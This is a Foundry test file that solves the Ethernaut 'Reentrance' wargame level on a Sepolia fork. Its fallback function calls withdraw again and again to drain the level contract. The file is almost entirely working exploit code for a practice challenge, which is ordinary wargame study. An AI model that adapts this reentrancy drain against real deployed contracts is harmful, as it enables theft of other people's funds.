// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.12;

import "forge-std/Test.sol";
import "forge-std/Vm.sol";
import "../src/levels/10-Reentrance/Reentrance.sol";

contract ContractTest is Test {
    Reentrance level10 =
        Reentrance(payable(0x5735a2A814220133159A96b50ADb9B3cc0fC7c00));

    function setUp() public {
        Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
        vm.createSelectFork(vm.rpcUrl("sepolia"));

        vm.label(address(this), "Attacker");
        vm.label(
            address(0x5735a2A814220133159A96b50ADb9B3cc0fC7c00),
            "Ethernaut10"
        );
    }

    function testEthernaut10() public {
        // before attack
        uint256 balance_before = address(this).balance;

        // attack
        level10.donate{value: 0.001 ether}(address(this));
        level10.withdraw(0.001 ether);

        // after attack
        uint256 balance_after = address(this).balance;
        assert(balance_after > balance_before);
    }

    fallback() external payable {
        level10.withdraw(0.001 ether);
    }
}
